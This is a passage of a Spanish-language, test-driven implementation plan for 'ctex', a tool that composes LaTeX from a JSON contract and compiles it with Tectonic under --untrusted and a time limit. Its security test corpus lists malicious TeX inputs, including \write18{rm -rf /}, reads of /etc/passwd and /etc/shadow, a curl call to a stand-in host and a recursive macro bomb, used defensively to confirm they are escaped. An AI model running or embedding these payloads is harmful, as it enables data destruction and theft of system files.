        trazos.append(f"    \\addplot coordinates {{{puntos}}};")
        trazos.append(f"    \\addlegendentry{{{escapar(serie.get('etiqueta', ''))}}}")

    cuerpo = "\n".join(trazos)
    opciones_texto = ",\n      ".join(opciones)
    titulo = escapar(contenido.get("titulo", ""))

    return (
        "\\begin{figure}[htbp]\n"
        "  \\centering\n"
        "  \\begin{tikzpicture}\n"
        "    \\begin{axis}[\n"
        f"      {opciones_texto},\n"
        "    ]\n"
        f"{cuerpo}\n"
        "    \\end{axis}\n"
        "  \\end{tikzpicture}\n"
        f"  \\caption{{{titulo}}}\n"
        "\\end{figure}"
    )
```

- [ ] **Paso 4: Correr las pruebas y verificar que pasan**

```
python -m pytest tests/composicion/test_bloques.py -v
```

Esperado: `21 passed`.

- [ ] **Paso 5: Commit**

```bash
git add src/ctex/composicion/bloques.py tests/composicion/test_bloques.py
git commit -m "Composicion: bloque de grafica con pgfplots, sin imagenes incrustadas"
```

---

## Tarea 7: El compositor del documento completo

**Archivos:**
- Crear: `src/ctex/composicion/compositor.py`
- Crear: `tests/composicion/test_compositor.py`

**Interfaces:**
- Consume: `envolver` (tarea 4), los cuatro `componer_*` (tareas 4–6).
- Produce:
  - `ctex.composicion.compositor.componer(documento: dict) -> tuple[str, list[str]]`
    — devuelve el `.tex` completo y la lista de advertencias.

- [ ] **Paso 1: Escribir las pruebas que fallan**

`tests/composicion/test_compositor.py`:

```python
import json
from pathlib import Path

from ctex.composicion.compositor import componer

DATOS = Path(__file__).parent.parent / "datos"


def cargar_ejemplo() -> dict:
    with open(DATOS / "hoja_ejemplo.json", encoding="utf-8") as f:
        return json.load(f)


def test_el_ejemplo_produce_un_documento_completo():
    tex, advertencias = componer(cargar_ejemplo())
    assert tex.startswith(r"\documentclass")
    assert tex.rstrip().endswith(r"\end{document}")
    assert advertencias == []


def test_los_bloques_salen_en_el_orden_del_contrato():
    tex, _ = componer(cargar_ejemplo())
    posicion_titulo = tex.index(r"\section{Series de Fourier}")
    posicion_ecuacion = tex.index(r"\begin{equation}")
    posicion_grafica = tex.index(r"\begin{tikzpicture}")
    assert posicion_titulo < posicion_ecuacion < posicion_grafica


def test_un_bloque_de_tipo_desconocido_se_salta_con_advertencia():
    # Regla 1 del contrato. Se prueba desde la v1 metiendo un tipo inventado.
    documento = cargar_ejemplo()
    documento["bloques"].append({
        "id": "b9",
        "tipo": "inventado",
        "region": {"x": 0, "y": 0, "ancho": 10, "alto": 10},
        "confianza": 0.5,
        "contenido": {"lo_que_sea": True},
    })

    tex, advertencias = componer(documento)

    assert len(advertencias) == 1
    assert "inventado" in advertencias[0]
    assert "b9" in advertencias[0]
    assert tex.startswith(r"\documentclass")


def test_un_bloque_desconocido_no_impide_componer_los_demas():
    documento = cargar_ejemplo()
    documento["bloques"].insert(0, {
        "id": "b0",
        "tipo": "tabla",
        "region": {"x": 0, "y": 0, "ancho": 10, "alto": 10},
        "confianza": 0.9,
        "contenido": {},
    })

    tex, _ = componer(documento)

    assert r"\section{Series de Fourier}" in tex
    assert r"\begin{tikzpicture}" in tex


def test_un_documento_sin_bloques_produce_un_pdf_vacio_valido():
    documento = cargar_ejemplo()
    documento["bloques"] = []
    tex, advertencias = componer(documento)
    assert r"\begin{document}" in tex
    assert advertencias == []
```

- [ ] **Paso 2: Correr las pruebas y verificar que fallan**

```
python -m pytest tests/composicion/test_compositor.py -v
```

Esperado: FALLA con `ModuleNotFoundError: No module named 'ctex.composicion.compositor'`.

- [ ] **Paso 3: Escribir el compositor**

`src/ctex/composicion/compositor.py`:

```python
"""Documento estructurado -> LaTeX (etapa 6).

Construye el .tex a partir del contrato con plantillas propias. Nunca copia y
pega lo que venga en el contrato: cada tipo de bloque tiene su compositor, y lo
que no reconoce lo salta.
"""

from ctex.composicion.bloques import (
    componer_ecuacion,
    componer_grafica,
    componer_parrafo,
    componer_titulo,
)
from ctex.composicion.plantilla import envolver

_COMPOSITORES = {
    "titulo": componer_titulo,
    "parrafo": componer_parrafo,
    "ecuacion": componer_ecuacion,
    "grafica": componer_grafica,
}


def componer(documento: dict) -> tuple[str, list[str]]:
    """Devuelve el .tex completo y las advertencias que se generaron.

    Regla 1 del contrato: un bloque de tipo desconocido se salta con
    advertencia, no revienta.
    """
    fragmentos: list[str] = []
    advertencias: list[str] = []

    for bloque in documento["bloques"]:
        compositor = _COMPOSITORES.get(bloque["tipo"])
        if compositor is None:
            advertencias.append(
                f"Bloque '{bloque['id']}' de tipo desconocido "
                f"'{bloque['tipo']}': se omitio."
            )
            continue
        fragmentos.append(compositor(bloque["contenido"]))

    return envolver("\n\n".join(fragmentos)), advertencias
```

- [ ] **Paso 4: Correr las pruebas y verificar que pasan**

```
python -m pytest tests/composicion/ -v
```

Esperado: `35 passed` — 9 de escapado, 21 de bloques y 5 de compositor.

- [ ] **Paso 5: Commit**

```bash
git add src/ctex/composicion/compositor.py tests/composicion/test_compositor.py
git commit -m "Composicion: documento completo, con salto de tipos desconocidos"
```

---

## Tarea 8: Compilación con Tectonic

**Archivos:**
- Crear: `src/ctex/compilacion/__init__.py`
- Crear: `src/ctex/compilacion/tectonic.py`
- Crear: `tests/compilacion/test_tectonic.py`

**Interfaces:**
- Consume: nada de tareas anteriores.
- Produce:
  - `ctex.compilacion.tectonic.compilar(tex: str, carpeta_salida: Path) -> Path`
    — devuelve la ruta del PDF.
  - `ctex.compilacion.tectonic.ErrorDeCompilacion(Exception)` — lleva el atributo
    `registro: str` con la salida de Tectonic.
  - `ctex.compilacion.tectonic.LIMITE_SEGUNDOS: int` — `60`.

- [ ] **Paso 1: Verificar que Tectonic está instalado y confirmar sus banderas**

```
tectonic --help
```

Esperado: la ayuda de Tectonic. Confirmar que existe la bandera `--untrusted` y
la de carpeta de salida (`-o` / `--outdir`). **Si los nombres difieren de los que
usa el paso 3, corregirlos ahí antes de seguir** — esta es la única parte del
plan que depende de una herramienta externa.

Si Tectonic no está instalado: https://tectonic-typesetting.github.io/

- [ ] **Paso 2: Escribir las pruebas que fallan**

`tests/compilacion/test_tectonic.py`:

```python
import shutil

import pytest

from ctex.compilacion.tectonic import ErrorDeCompilacion, compilar

pytestmark = pytest.mark.skipif(
    shutil.which("tectonic") is None,
    reason="Tectonic no esta instalado",
)

TEX_MINIMO = r"""\documentclass{article}
\begin{document}
Hola.
\end{document}
"""

TEX_ROTO = r"""\documentclass{article}
\begin{document}
\begin{itemize}
\end{document}
"""


def test_un_documento_minimo_produce_un_pdf(tmp_path):
    pdf = compilar(TEX_MINIMO, tmp_path)
    assert pdf.exists()
    assert pdf.suffix == ".pdf"
    assert pdf.stat().st_size > 0


def test_el_pdf_empieza_con_la_firma_de_pdf(tmp_path):
    pdf = compilar(TEX_MINIMO, tmp_path)
    assert pdf.read_bytes()[:5] == b"%PDF-"


def test_el_tex_se_conserva_junto_al_pdf(tmp_path):
    # La salida es el PDF y el .tex: el .tex es del usuario.
    compilar(TEX_MINIMO, tmp_path)
    assert (tmp_path / "documento.tex").exists()


def test_un_documento_roto_levanta_con_el_registro(tmp_path):
    with pytest.raises(ErrorDeCompilacion) as excepcion:
        compilar(TEX_ROTO, tmp_path)
    assert excepcion.value.registro != ""
```

- [ ] **Paso 3: Escribir el invocador**

`src/ctex/compilacion/__init__.py`:

```python
from ctex.compilacion.tectonic import ErrorDeCompilacion, compilar

__all__ = ["ErrorDeCompilacion", "compilar"]
```

`src/ctex/compilacion/tectonic.py`:

```python
"""Invocacion de Tectonic (etapa 7).

Compilar es ejecutar, asi que esto corre con las defensas de la Seccion 9:
shell-escape desactivado via --untrusted, y un limite de tiempo que mata el
proceso. El limite de memoria y la ausencia de red los pone el contenedor, no
este modulo.
"""

import subprocess
from pathlib import Path

LIMITE_SEGUNDOS = 60

NOMBRE_FUENTE = "documento.tex"
NOMBRE_PDF = "documento.pdf"


class ErrorDeCompilacion(Exception):
    """Tectonic no produjo un PDF."""

    def __init__(self, mensaje: str, registro: str = "") -> None:
        super().__init__(mensaje)
        self.registro = registro


def compilar(tex: str, carpeta_salida: Path) -> Path:
    """Compila el .tex y devuelve la ruta del PDF.

    El .tex se conserva junto al PDF: es del usuario y puede llevarselo.
    """
    carpeta_salida = Path(carpeta_salida)
    carpeta_salida.mkdir(parents=True, exist_ok=True)

    fuente = carpeta_salida / NOMBRE_FUENTE
    fuente.write_text(tex, encoding="utf-8")

    try:
        resultado = subprocess.run(
            [
                "tectonic",
                "--untrusted",      # sin shell-escape, sin rutas absolutas
                "--outdir", str(carpeta_salida),
                str(fuente),
            ],
            capture_output=True,
            text=True,
            timeout=LIMITE_SEGUNDOS,
            check=False,
        )
    except subprocess.TimeoutExpired as error:
        raise ErrorDeCompilacion(
            f"La compilacion excedio {LIMITE_SEGUNDOS} s y se mato el proceso."
        ) from error

    pdf = carpeta_salida / NOMBRE_PDF
    if resultado.returncode != 0 or not pdf.exists():
        raise ErrorDeCompilacion(
            "Tectonic no produjo un PDF.",
            registro=resultado.stderr or resultado.stdout,
        )

    return pdf
```

- [ ] **Paso 4: Correr las pruebas y verificar que pasan**

```
python -m pytest tests/compilacion/ -v
```

Esperado: `4 passed`. Si Tectonic no está instalado: `4 skipped` — en ese caso
instalarlo antes de seguir, porque la tarea 9 lo necesita.

- [ ] **Paso 5: Commit**

```bash
git add src/ctex/compilacion/ tests/compilacion/
git commit -m "Compilacion: invocar Tectonic sin confianza, con limite de tiempo"
```

---

## Tarea 9: El comando de línea, de punta a punta

**Archivos:**
- Crear: `src/ctex/cli.py`
- Crear: `tests/test_extremo_a_extremo.py`

**Interfaces:**
- Consume: `validar` (tarea 2), `componer` (tarea 7), `compilar` (tarea 8).
- Produce: `ctex.cli.main(argv: list[str] | None = None) -> int`.

- [ ] **Paso 1: Escribir las pruebas que fallan**

`tests/test_extremo_a_extremo.py`:

```python
import json
import shutil
from pathlib import Path

import pytest

from ctex.cli import main

DATOS = Path(__file__).parent / "datos"

pytestmark = pytest.mark.skipif(
    shutil.which("tectonic") is None,
    reason="Tectonic no esta instalado",
)


def test_del_json_de_ejemplo_sale_un_pdf(tmp_path):
    codigo = main([str(DATOS / "hoja_ejemplo.json"), "--salida", str(tmp_path)])

    assert codigo == 0
    assert (tmp_path / "documento.pdf").exists()
    assert (tmp_path / "documento.tex").exists()


def test_un_json_invalido_sale_con_codigo_2(tmp_path, capsys):
    invalido = tmp_path / "malo.json"
    invalido.write_text(json.dumps({"version_contrato": "9.9"}), encoding="utf-8")

    codigo = main([str(invalido), "--salida", str(tmp_path / "salida")])

    assert codigo == 2
    assert "invalido" in capsys.readouterr().err.lower()


def test_las_advertencias_se_reportan(tmp_path, capsys):
    with open(DATOS / "hoja_ejemplo.json", encoding="utf-8") as f:
        documento = json.load(f)
    documento["bloques"].append({
        "id": "b9",
        "tipo": "inventado",
        "region": {"x": 0, "y": 0, "ancho": 10, "alto": 10},
        "confianza": 0.5,
        "contenido": {},
    })
    entrada = tmp_path / "con_desconocido.json"
    entrada.write_text(json.dumps(documento), encoding="utf-8")

    codigo = main([str(entrada), "--salida", str(tmp_path / "salida")])

    assert codigo == 0
    assert "inventado" in capsys.readouterr().err
```

- [ ] **Paso 2: Correr las pruebas y verificar que fallan**

```
python -m pytest tests/test_extremo_a_extremo.py -v
```

Esperado: FALLA con `ModuleNotFoundError: No module named 'ctex.cli'`.

- [ ] **Paso 3: Escribir el comando**

`src/ctex/cli.py`:

```python
"""El motor por linea de comandos (D9).

    ctex hoja.json --salida ./salida
"""

import argparse
import json
import sys
from pathlib import Path

from ctex.compilacion.tectonic import ErrorDeCompilacion, compilar
from ctex.composicion.compositor import componer
from ctex.contrato.validador import ErrorDeContrato, validar


def main(argv: list[str] | None = None) -> int:
    analizador = argparse.ArgumentParser(
        prog="ctex",
        description="Convierte un documento del contrato en un PDF compuesto con LaTeX.",
    )
    analizador.add_argument("entrada", type=Path, help="Archivo JSON del contrato")
    analizador.add_argument(
        "--salida", type=Path, default=Path("salida"),
        help="Carpeta donde se escriben el PDF y el .tex",
    )
    argumentos = analizador.parse_args(argv)

    with open(argumentos.entrada, encoding="utf-8") as archivo:
        documento = json.load(archivo)

    try:
        validar(documento)
    except ErrorDeContrato as error:
        print(f"Documento invalido: {error}", file=sys.stderr)
        return 2

    tex, advertencias = componer(documento)
    for advertencia in advertencias:
        print(f"Advertencia: {advertencia}", file=sys.stderr)

    try:
        pdf = compilar(tex, argumentos.salida)
    except ErrorDeCompilacion as error:
        print(f"No compilo: {error}", file=sys.stderr)
        if error.registro:
            print(error.registro, file=sys.stderr)
        return 3

    print(pdf)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

- [ ] **Paso 4: Correr las pruebas y verificar que pasan**

```
python -m pytest tests/test_extremo_a_extremo.py -v
```

Esperado: `3 passed`.

- [ ] **Paso 5: Correr el comando de verdad y mirar el PDF**

```
ctex tests/datos/hoja_ejemplo.json --salida ./salida
```

Esperado: imprime `salida/documento.pdf`. **Abrir ese PDF.** Debe tener el título
"Series de Fourier", la ecuación numerada y la gráfica dibujada con pgfplots.

Este es el momento en que la caminata esquelética queda demostrada.

- [ ] **Paso 6: Commit**

```bash
git add src/ctex/cli.py tests/test_extremo_a_extremo.py
git commit -m "CLI: de JSON del contrato a PDF, de punta a punta"
```

---

## Tarea 10: El corpus de seguridad

La Sección 11 lo pide explícitamente: *"corpus de `.tex` maliciosos que deben
quedar bloqueados. Cada defensa de la Sección 9 con su prueba."*

**Archivos:**
- Crear: `tests/test_seguridad.py`

**Interfaces:**
- Consume: `componer` (tarea 7), `compilar` (tarea 8).
- Produce: nada. Es solo verificación.

- [ ] **Paso 1: Escribir las pruebas**

Estas pruebas deben pasar **de inmediato** si las tareas 3, 5 y 8 se hicieron
bien. Si alguna falla, hay un agujero real.

`tests/test_seguridad.py`:

```python
import shutil

import pytest

from ctex.composicion.compositor import componer


def documento_con_ecuacion(latex: str) -> dict:
    return {
        "version_contrato": "1.0",
        "origen": {"archivo": "ataque.jpg", "pagina": 1},
        "bloques": [{
            "id": "b1",
            "tipo": "ecuacion",
            "region": {"x": 0, "y": 0, "ancho": 10, "alto": 10},
            "confianza": 0.99,
            "contenido": {"latex": latex, "numerada": True},
        }],
        "dudas": [],
    }


def documento_con_parrafo(texto: str) -> dict:
    documento = documento_con_ecuacion("x=1")
    documento["bloques"][0]["tipo"] = "parrafo"
    documento["bloques"][0]["contenido"] = {"texto": texto}
    return documento


ATAQUES = [
    r"\write18{rm -rf /}",
    r"\input{/etc/passwd}",
    r"\include{/etc/shadow}",
    r"\def\x{\x\x}\x",
    r"\csname write\endcsname18{ls}",
    r"\openout1=/tmp/robado.txt",
    r"\catcode`\@=11",
    r"\immediate\write18{curl http://malo.example}",
]


@pytest.mark.parametrize("ataque", ATAQUES)
def test_un_ataque_en_una_ecuacion_no_llega_al_tex(ataque):
    tex, _ = componer(documento_con_ecuacion(ataque))
    assert r"\write18" not in tex
    assert r"\input{" not in tex
    assert r"\openout" not in tex
    assert r"\csname" not in tex
    assert r"\def\x" not in tex


@pytest.mark.parametrize("ataque", ATAQUES)
def test_un_ataque_en_un_parrafo_no_llega_al_tex(ataque):
    # El caso de la Seccion 9: alguien escribe el ataque a mano en el cuaderno
    # y el reconocedor lo transcribe como prosa.
    tex, _ = componer(documento_con_parrafo(ataque))
    assert r"\write18" not in tex
    assert r"\input{" not in tex


def test_el_texto_del_ataque_si_aparece_pero_inerte():
    # No se borra la evidencia: el usuario ve lo que escribio, sin que se ejecute.
    tex, _ = componer(documento_con_parrafo(r"\write18{ls}"))
    assert "write18" in tex
    assert r"\textbackslash{}write18" in tex


@pytest.mark.skipif(shutil.which("tectonic") is None, reason="Tectonic no instalado")
@pytest.mark.parametrize("ataque", ATAQUES)
def test_un_documento_con_ataque_compila_igual(ataque, tmp_path):
    # D18: el motor siempre entrega un PDF. Un ataque se degrada, no revienta.
    from ctex.compilacion.tectonic import compilar

    tex, _ = componer(documento_con_ecuacion(ataque))
    pdf = compilar(tex, tmp_path)
    assert pdf.exists()
```

- [ ] **Paso 2: Correr las pruebas**

```
python -m pytest tests/test_seguridad.py -v
```

Esperado: todas pasan. **Si alguna falla, no seguir**: hay un comando que
atraviesa la lista blanca o un texto que llega sin escapar. Arreglar en
`escapado.py` y volver a correr.

- [ ] **Paso 3: Correr la suite completa**

```
python -m pytest -v
```

Esperado: todo pasa, sin `failed`.

- [ ] **Paso 4: Commit**

```bash
git add tests/test_seguridad.py
git commit -m "Seguridad: corpus de ataques bloqueados, una prueba por defensa"
```

---

## Terminado cuando

- [ ] `python -m pytest` pasa completo
- [ ] `ctex tests/datos/hoja_ejemplo.json --salida ./salida` produce un PDF
- [ ] Ese PDF, abierto, muestra el título, la ecuación numerada y la gráfica
      dibujada por pgfplots
- [ ] El corpus de ataques queda bloqueado, con una prueba por defensa
- [ ] Un bloque de tipo inventado se salta con advertencia y el resto compila

En ese momento **el contrato dejó de ser un documento y es código ejecutable**, y
la fase 1 tiene dónde entregar.

---

## Lo que sigue, en orden

| # | Qué | Depende de |
|---|---|---|
| 1 | **Fase 0 — R4:** revisar qué conjuntos de datos de escritura manuscrita y matemática existen y bajo qué licencia comercial. Es bloqueante para la fase 3 y puede activar D28.1 | nada — se puede hacer en paralelo a este plan |
| 2 | **Fase 0 — material de prueba:** generar los niveles 0 y 1 de la Sección 11 | nada |
| 3 | **Ciclo de reparación (D17):** reparaciones deterministas, reintento, degradación por bloque | este plan |
| 4 | **Fase 1 — extractor de gráficas:** las etapas 1, 2 y 3 para el tipo `grafica` | este plan y el punto 2 |

El plan de la fase 1 se escribe **después** de terminar este, no ahora: su
descomposición depende de lo que se aprenda del contrato al usarlo de verdad.
